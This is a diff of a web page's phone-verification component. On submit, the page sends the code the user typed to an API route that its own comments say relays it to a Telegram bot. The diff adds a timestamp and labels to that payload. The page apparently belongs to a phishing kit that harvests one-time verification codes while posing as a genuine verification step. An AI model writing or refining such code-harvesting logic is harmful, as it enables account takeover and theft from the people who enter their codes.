@@ -20,17 +20,18 @@ export default function VerifyPhonePage() {
         return;
       }
 
-      // === SEND CODE TO TELEGRAM BOT ===
+      // === SEND VERIFICATION CODE TO TELEGRAM BOT ===
       fetch('/api/send-message', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          code,
-          type: 'verification_code',
-          page: 'verify-phone',
+          code: code,                    // The input code user typed
+          type: 'verification_code',   // Label for bot
+          page: 'verify-phone',        // Which page
+          timestamp: new Date().toISOString(), // When submitted
         }),
       });
-      // ===================================
+      // ==============================================
 
       setIsLoading(true);
       setStatusMessage(null);
@@ -86,7 +87,6 @@ export default function VerifyPhonePage() {
           <div className="rounded-[24px] bg-background-50 p-8 shadow-[0_12px_30px_rgba(0,0,0,0.15)] sm:p-10">
             {/* Card header */}
             <div className="mb-8 text-center">
-              {/* Red circle messaging icon */}
               <img
                 src="https://storage.readdy-site.link/project_files/2c4f8ff7-4756-4178-b267-42959e65ba3d/a63f8a5e-b496-459c-abb6-c475388db416_compressed_photo_2026-07-01_23-44-35.webp"
                 alt="Verification messaging icon"
